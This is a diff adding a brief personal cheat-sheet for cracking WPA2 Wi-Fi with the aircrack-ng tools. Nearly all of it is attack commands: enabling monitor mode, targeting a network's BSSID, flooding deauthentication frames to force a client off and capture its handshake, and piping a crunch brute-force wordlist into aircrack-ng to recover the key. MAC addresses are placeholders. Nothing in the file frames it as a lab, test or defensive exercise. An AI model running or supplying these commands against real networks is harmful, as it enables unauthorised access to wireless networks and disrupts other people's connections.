@@ -1,0 +1,12 @@
+@ start interface mode monitor ( airmon-ng wlan0 )
+@ normal airodump ( airodump-ng wlan0mon )
+@ specific airodump ( airodump-ng --channel # --bssid ##:##:##:##:##:se --write # @interface )
+
+~ deauth connections 
+
+@ deauth with 0 ACk ( aireplay-ng --deauth (0) -a ##:##:##:##:##:se -c ##:##:##:##:##:tt wlan0mon
+ > to WPA Handshake : ##:##:##:##:##:se
+
+@ create wordlist with crunch
+@ > # crunch 8 14 | aircrack-ng -a2 -b ##:##:##:##:##:se -w - /dir/*.cap
+
